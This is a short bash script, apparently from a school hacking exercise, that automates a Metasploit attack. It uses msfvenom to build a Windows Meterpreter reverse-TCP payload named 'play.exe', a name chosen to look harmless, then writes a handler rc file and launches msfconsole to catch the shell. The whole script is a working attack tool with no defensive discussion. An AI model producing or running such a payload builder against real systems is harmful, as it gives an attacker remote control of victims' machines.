#!/bin/bash
#Laurea School hacking project
#@members: Petteri, Matias, Jani, Anish


echo "Hacking Excercise";
echo "=========================";

LPORT="4444";
LHOST=`/sbin/ifconfig | sed -n '2 p' | awk '{print $2}'`;
EXE="play.exe";

echo "LHOST=$LHOST";
echo "LPORT=$LPORT";

echo "Creating Executable for target machine";
#using msfvenom with reverse tcp

msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f exe -a x86 > $EXE


echo "Creating metasploit rc file";

FILENAME=meterpreter.rc
cat > $FILENAME <<EOF
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $LHOST
set lport $LPORT
exploit -j -z
EOF

echo "rc file created successfully";
echo "==============================================";
echo "Start Hacking. The fun part begins from here.......";

#start msfconsole session
msfconsole -r $FILENAME
